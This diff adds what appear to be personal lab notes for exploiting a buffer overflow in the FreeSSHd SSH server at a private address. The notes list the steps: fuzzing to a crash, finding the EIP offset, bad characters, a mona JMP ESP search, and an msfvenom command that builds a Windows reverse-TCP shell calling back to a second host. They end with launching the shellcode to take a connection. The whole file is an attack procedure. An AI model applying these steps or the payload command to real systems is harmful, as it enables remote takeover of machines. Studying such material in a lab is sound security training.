@@ -1,0 +1,30 @@
+/Freesshd
+
+
+IP:192.168.43.156
+Port 22 (ssh)
+___________________________________________________
+1. Fuzzing remote conectiona dn find crash poin 20400
+
+2. Sending patten and find offset -l 20400 and find vlaue of EIP (326A4231) TOS (6A42346A)
+
+3. finding offset vlaue 1055 | 1063
+
+
+4. Finding bad char {\x00}
+
+
+5. finding JMP ESP !mona find -s "\xff\xe4" -m user32.dll
+
+6. Control EIP
+
+
+7. . SHellcode {msfvenom -p windows/shell_reverse_tcp LHOS=192.168.43.223 LPORT=1234 EXITFUNC=thread -f c  -b "\x00"
+}
+
+
+* launch shellcode and take connection
+
+
+
+
